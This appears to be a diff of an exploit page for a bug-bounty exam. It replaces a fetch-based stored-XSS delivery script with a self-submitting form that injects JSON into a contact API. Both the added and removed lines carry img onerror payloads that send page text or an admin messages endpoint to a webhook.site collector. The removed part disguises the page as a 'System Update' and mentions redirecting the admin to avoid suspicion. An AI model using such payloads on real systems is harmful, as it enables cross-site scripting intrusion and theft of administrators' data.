@@ -1,35 +1,11 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>System Update</title>
-</head>
 <body>
-    <h1>Processing Request...</h1>
+    <form id="xss" action="https://api-bugbounty-exam.hashacademy.co/api/contact/submit" method="POST" enctype="text/plain">
+        <input type="hidden" name='{"name":"test","email":"jikuxn9@gmail.com","subject":"Urgent","message":"<img src=x onerror=\"location=&apos;https://webhook.site/f0c27699-6e26-4893-b47f-8e1c45b045ae?flag=&apos;+document.body.innerText\">","category":"general","priority":"medium","ignore":"' value='"}'>
+    </form>
     <script>
-        // The target endpoint where the contact form submits
-        const targetUrl = "https://TARGET-APP-URL.com/api/contact"; 
-
-        const payload = {
-            "name": "Saja",
-            "email": "research@seoulaura.com",
-            "subject": "Urgent: System Vulnerability Report",
-            "message": "<img src=x onerror=\"fetch('/api/admin/messages/69eb6dd4bee6d6b7c6647b55').then(r=>r.text()).then(t=>fetch('https://webhook.site/f0c27699-6e26-4893-b47f-8e1c45b045ae',{method:'POST',mode:'no-cors',body:btoa('EXAM_FLAG:'+t)}))\">",
-            "category": "technical",
-            "priority": "high"
-        };
-
-        fetch(targetUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload),
-            mode: 'no-cors' // Use no-cors if the API doesn't have permissive CORS headers
-        }).then(() => {
-            console.log("Payload delivered. Redirecting...");
-            // Optional: Redirect admin to a real page to avoid suspicion
-            // window.location = "https://TARGET-APP-URL.com/dashboard";
-        });
+        document.getElementById('xss').submit();
     </script>
 </body>
 </html>
